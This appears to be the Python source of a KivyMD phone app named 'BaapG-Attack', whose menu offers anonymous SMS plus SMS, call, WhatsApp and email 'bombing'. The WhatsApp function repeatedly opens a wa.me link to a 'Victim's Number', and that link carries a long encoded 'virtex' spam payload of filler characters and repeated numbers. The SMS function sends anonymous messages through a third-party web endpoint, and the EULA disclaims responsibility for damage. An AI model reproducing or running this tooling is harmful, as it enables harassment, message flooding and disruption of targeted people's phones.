import os
import sys
def install(package):
	for i in package:
		try:
			exec(f"import {i}")
			pass
		except Exception:
			print(f"Installing {i}")
			os.system(f"pip3 install {i}")
	return None
install(["kivy","kivymd","requests","plyer"])

import webbrowser
import os
from kivymd.app import MDApp
from kivymd.uix.label import MDLabel
from kivy.uix.image import Image
from kivy.uix.screenmanager import ScreenManager,Screen
from kivy.lang import Builder
from kivy.core.text import LabelBase 
from kivymd.uix.button import MDRoundFlatButton,MDRectangleFlatIconButton
from kivymd.uix.screen import MDScreen
from kivymd.uix.textfield import MDTextField
from kivy.core.audio import SoundLoader
from kivymd.uix.list import TwoLineListItem
from kivymd.toast import toast
from kivy.uix.scrollview import ScrollView
import socket
import os
import subprocess
import sys
import threading
from pathlib import Path
from kivy.clock import Clock
from functools import partial
from kivymd.icon_definitions import md_icons
screen_manager = ScreenManager()
android_plat = True
mainScreen = """
MDScreen:	
	MDFloatLayout:
		md_bg_color: 0,0,0,1

		Image:
			source:"log.jpg"
			pos_hint : {"center_x":0.5,"center_y":0.23}
			size_hint_y: 0.69
			size_hint_x: 0.69

		Image :
			id : gif 
			source : "circle.gif"
			pos_hint :  {"center_x":0.5,"center_y":0.65}


			size_hint_y: 0.59
			size_hint_x: 0.59
			anim_delay: 0.05
    		allow_stretch: True


		Image:
			source :"logo.png"
			pos_hint :  {"center_x":0.5,"center_y":0.65}
			size_hint_y: 0.45
			size_hint_x: 0.45
"""
perscr = """
MDScreen:
	name: "perscreen"
	MDFloatLayout:

		md_bg_color: 1,1,1,1
		MDLabel:
			text : "EULA"	
			hlaign : "Center"
			pos_hint : {"center_x":0.75,"center_y":0.9}
			font_size : "35sp"
			font_name : "Poppins-Regular.ttf"	
		Image:
			source : "protection.gif"
			pos_hint : {"center_x":0.14,"center_y":0.9}
			size_hint_y: 0.2
			size_hint_x: 0.2
			anim_delay: 0.05
			anim_loop: 50
		MDLabel:
			text : "By using BaapG-Attack you agree our terms of service . This software is free to use and you can use it free of cost . Any damage to any one using this software by you is not our *take* and we are not completely responsible for this."
			pos_hint : {"center_x":0.5,"center_y":0.55}
			halign :"center"
			font_name : "Poppins-Regular.ttf"
		MDRoundFlatButton:
			text : "Accept"
			on_press:app.permission()
			halign :"center"
			pos_hint : {"center_x":0.5,"center_y":0.35}
				
				

"""
import time
net ="""
MDScreen:
	name : "net"
	MDFloatLayout:
		md_bg_color : 0,0,0,1
		MDLabel
			text : "You are Fine"
			halign : 'center'
			pos_hint : {'center_y':0.9}
			theme_text_color : "Custom"
			text_color : 1,1,1,1
			#pos_hint : {'center_x':0.14,'center_y':0.5}
			font_name : "Poppins-Regular.ttf"
			font_size : "35sp"
		Image:
			source: 'wifi.png'
			halign : "center"
			size_hint_y: 0.45
			size_hint_x: 0.45
			pos_hint :  {"center_x":0.5,"center_y":0.65}
		MDRoundFlatButton:
			text : "Proceed" 
			pos_hint : {"center_x":0.5,"center_y":0.35}
			halign : "center"
			line_color : 1,1,1,1
			text_color : 1,1,1,1
			on_press : app.home()		
"""
netof = """
MDScreen:
	name : "netof"
	MDFloatLayout:
		md_bg_color : 0,0,0,1
		MDLabel
			text : app.b
			halign : 'center'
			pos_hint : {'center_y':0.9}
			theme_text_color : "Custom"
			text_color : 1,1,1,1
			#pos_hint : {'center_x':0.14,'center_y':0.5}
			font_name : "Poppins-Regular.ttf"
			font_size : "35sp"
		Image:
			source: 'no-wifi.png'
			halign : "center"
			size_hint_y: 0.45
			size_hint_x: 0.45
			pos_hint :  {"center_x":0.5,"center_y":0.65}
		MDRoundFlatButton:
			text : "Reload"
			pos_hint : {"center_x":0.5,"center_y":0.35}
			halign : "center"
			line_color : 1,1,1,1
			text_color : 1,1,1,1
			on_press : app.reload()		
"""

mainv = """
MDScreen:
	name : "mainv"
	MDLabel:
		text:"Select from above options"
		pos_hint : {"center_x":0.5,"center_y":0.80}
		halign :"center"
		font_name : "Poppins-Regular.ttf"
	MDLabel:
		text :" Main Menu"
		font_name :"Poppins-Regular.ttf"
		font_size : "50sp"
		halign : "center"
		pos_hint : {"center_x":0.5,"center_y":0.85}
	MDRectangleFlatIconButton:
		text : "Anonymous Message"
		pos_hint : {"center_x":0.5,"center_y":0.65}
		icon : "message"
	
		line_width :2
		font_name : "Poppins-Regular.ttf"
		font_size : "20sp"
		on_press : app.get_number()
	MDRectangleFlatIconButton:
		text : "   Sms+Call Bomber   "
		pos_hint : {"center_x":0.5,"center_y":0.55}
		icon : "bomb"
		icon_color : 0,0,0,1
		line_width :2
		font_name : "Poppins-Regular.ttf"
		font_size : "20sp"
		text_color: 0,0,0,1
		line_color : 0,0,0,1
	MDRectangleFlatIconButton:
		text : "  Whatsapp Bomber  "
		pos_hint : {"center_x":0.5,"center_y":0.45}
		icon : "whatsapp"
		icon_color : 0,1,0,1
		line_width :2
		font_name : "Poppins-Regular.ttf"
		font_size : "20sp"
		text_color : 0,1,0,1
		line_color :0,1,0,1
		on_press : app.wp()
	MDRectangleFlatIconButton:
		text :  "       Email Bomber       "
		pos_hint : {"center_x":0.5,"center_y":0.35}
		icon : "email"
		icon_color : 1,0,0,1
		line_width :2
		font_name : "Poppins-Regular.ttf"
		font_size : "20sp"
		text_color : 1,0,0,1
		line_color :1,0,0,1
	MDLabel:
		text:" Developers : Ansh Dadwal , Krishna , Sando Varghese "
		font_style : "Caption"	
		font_name : "Poppins-Regular.ttf"
		pos_hint : {"center_x":0.5,"center_y":0.02}
	Image:
		source :"log1.png"
		pos_hint :  {"center_x":0.5,"center_y":0.15}
		size_hint_y: 0.55
		size_hint_x: 0.55
		
"""
wp2 = """
MDScreen:
	name : "wp2"
	MDFloatLayout:
		md_bg_color : 1,1,1,1

		Image:
			source : "progress.gif"
			halign : "center"			
			size_hint_y: 0.49
			size_hint_x: 0.49
			anim_delay: 0.05
    		allow_stretch: True
    		pos_hint :  {"center_x":0.5,"center_y":0.65}
    	MDLabel:
    		text:"  Bombing In Progress"
    		font_name : "Poppins-Regular.ttf"
    		font_size : "30sp"
    		pos_hint : {"center_x":0.5,"center_y":0.90}
    	MDRectangleFlatIconButton:
			text : " HOME "
			pos_hint : {"center_x":0.5,"center_y":0.35}
			icon: "home"
			on_press : app.home()  
"""
phno="""
MDScreen:
	name:"phnno"
	MDIconButton:
        icon: "backburger"
        pos_hint: {"center_x":0.1, "center_y": 0.95}
        text: "Back"
        on_press : app.home()
	MDLabel:
		text : "Phone Number"
		font_name : 'Poppins-Regular.ttf'
		font_size : '35sp'
		pos_hint : {"center_x":0.55,"center_y":0.90}
	MDLabel:
		text : "Indian Number"
		font_name : 'Poppins-Regular.ttf'
		font_size : '20sp'
		them_text_color : 'caption'
		pos_hint : {"center_x":0.68,"center_y":0.85}

	MDTextField:
		id : input
		hint_text : "Indian Number "
		mode:"rectangle"
		halign :"center"
		pos_hint : {"center_x":0.5,"center_y":0.65}
		max_text_length: 10
		size_hint_y :0.10
		size_hint_x : 0.6
		required: True
	MDTextField:
		id : input1
		hint_text : "Message to be sent "
		mode:"rectangle"
		halign :"center"
		pos_hint : {"center_x":0.5,"center_y":0.55}
		size_hint_y :0.10
		size_hint_x : 0.6
		required: True
	MDRectangleFlatIconButton:
		text : " SEND "
		pos_hint : {"center_x":0.5,"center_y":0.45}
		icon: "send"
		on_press : app.send(input1.text,input.text)
		
"""
success = """
MDScreen:
	name : "success"
	MDFloatLayout:
		md_bg_color : 1,1,1,1
		Image:
			source : "done.gif"
			halign : "center"			
			size_hint_y: 0.49
			size_hint_x: 0.49
			anim_delay: 0.05
    		allow_stretch: True
    		pos_hint :  {"center_x":0.5,"center_y":0.65}
	MDRectangleFlatIconButton:
		text : " HOME "
		pos_hint : {"center_x":0.5,"center_y":0.35}
		icon: "home"
		on_press : app.home()  			
"""
wpb = """
MDScreen:
	name:"wpbomb"
	MDIconButton:
        icon: "backburger"
        pos_hint: {"center_x":0.1, "center_y": 0.95}
        text: "Back"
        on_press : app.home()
	MDLabel:
		text : "Phone Number"
		font_name : 'Poppins-Regular.ttf'
		font_size : '35sp'
		pos_hint : {"center_x":0.55,"center_y":0.90}
	MDLabel:
		text : "Enter CC and Number"
		font_name : 'Poppins-Regular.ttf'
		font_size : '20sp'
		them_text_color : 'caption'
		pos_hint : {"center_x":0.68,"center_y":0.85}

	MDTextField:
		id : input
		hint_text : "Country Code without +"
		mode:"rectangle"
		halign :"center"
		pos_hint : {"center_x":0.5,"center_y":0.65}
		max_text_length: 3
		size_hint_y :0.10
		size_hint_x : 0.6
		required: True
	MDTextField:
		id : input1
		hint_text : "Victim's Number"
		mode:"rectangle"
		halign :"center"
		pos_hint : {"center_x":0.5,"center_y":0.55}
		size_hint_y :0.10
		size_hint_x : 0.6
		required: True
		max_text_length :10
	MDTextField:
		id : input2
		hint_text : "Number of messages"
		mode:"rectangle"
		halign :"center"
		pos_hint : {"center_x":0.5,"center_y":0.45}
		size_hint_y :0.10
		size_hint_x : 0.6
		required: True
		max_text_length : 2
	MDRectangleFlatIconButton:
		text : " SEND "
		pos_hint : {"center_x":0.5,"center_y":0.35}
		icon: "send"
		on_press : app.wpsend(input.text+input1.text,int(input2.text))
"""
def test(ok):
	screen_manager.current="success"	
def wpbomb(number,times):
	link = (f"""https://wa.me/{number}/?text=BaapG%20Jai%20Hind%F0%9F%92%A3%20Ghazipur%20Up%20India%F0%9F%92%A3%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%0A%F0%9F%98%88Follow%20Me%20On%20Insta%20%40krish_na_2568%F0%9F%A4%A3%0A%F0%9F%94%A5HAY%20DUDA%20NIKAH%20YUK%20AWOKWOK%20%F0%9F%98%88%0A*https%3A%2F%2Fyoutu.be%2F4S-i078-YYE*%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A*VIRTEX%20BUATAN%20MR%20VIRUS%20BUKAN%20KALENG%C2%B2*%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%F0%9F%93%8CBY%E2%80%A2MR%E2%80%A2VURUS-SPM%F0%9F%92%A3%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*
""")
	for i in range(0,times):
		Clock.schedule_once(partial (webbrowser.open,link),4)
	Clock.schedule_once(partial(test),times*4)

import urllib.parse
import requests
def send_sms(message,number):
 url1 = f"https://www.customsms.tk/sms.php?num={number}&msg={urllib.parse.quote(message)}"
 a = requests.get(url1)
 return a 

def check_intr():
	import requests
	try:
		requests.get("https://google.com",timeout=0.5)
	except Exception as e:
		return False
	return  True

class MyApp(MDApp):
	a = 0	
	b = f"No internet {a}"
	def wp(self):
		screen_manager.current = "wpbomb"
	def reload(self):
		if check_intr() == True:
			screen_manager.current = "net"
		else:
			screen_manager.current = "netof"		
	def build(self):
		screen_manager.add_widget(Builder.load_string(mainScreen))
		screen_manager.add_widget(Builder.load_string(perscr))
		screen_manager.add_widget(Builder.load_string(net))
		screen_manager.add_widget(Builder.load_string(netof))
		screen_manager.add_widget(Builder.load_string(mainv))
		screen_manager.add_widget(Builder.load_string(phno))
		screen_manager.add_widget(Builder.load_string(success))
		screen_manager.add_widget(Builder.load_string(wpb))
		screen_manager.add_widget(Builder.load_string(wp2))
		return screen_manager
	def home(self):

		screen_manager.current = "mainv"	
	def on_start(self):
		pass
		Clock.schedule_once(self.login,12)
	def login(self,obj):
		if os.path.exists("eula.txt"):
			if check_intr() == True:
				screen_manager.current = "net"
			else:
				a =+1 
				screen_manager.current = "netof"
		else:
			screen_manager.current = "perscreen"
	def get_number(self):
		screen_manager.current = "phnno"
	def send(self,message,number):
		send_sms(message,number)
		screen_manager.current = "success"
	def wpsend(self,number,times):
		screen_manager.current = "wp2"
		wpbomb (number,times)
		
	def permission(self):
		Path("eula.txt").touch()
		if check_intr() == True:
			screen_manager.current = "net"
		else:
			a =+1 
			screen_manager.current = "netof"



                 
if __name__ == "__main__" :
	MyApp().run()